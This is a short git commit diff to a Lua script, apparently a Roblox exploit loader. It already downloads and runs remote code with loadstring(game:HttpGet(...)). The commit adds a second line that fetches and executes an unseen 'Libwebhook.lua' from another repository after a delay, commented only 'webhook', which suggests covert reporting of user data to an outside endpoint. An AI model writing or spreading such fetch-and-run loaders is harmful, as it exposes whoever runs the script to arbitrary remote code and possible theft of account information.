9023971d957d2561753550fbaf57c5094f6adfeb
Swiftz007 <cxllme14zx@gmail.com>
2026-07-11 18:26:05 +0700

    Update A.lua

--- A.lua
+++ A.lua
@@ -3,3 +3,5 @@
 --else
     loadstring(game:HttpGet("https://raw.githubusercontent.com/Swiftz007/Normal/refs/heads/main/testreaper.lua"))()
 --end
+task.wait(2)
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Swiftz007/Libwtf/refs/heads/main/Libwebhook.lua"))() --webhook
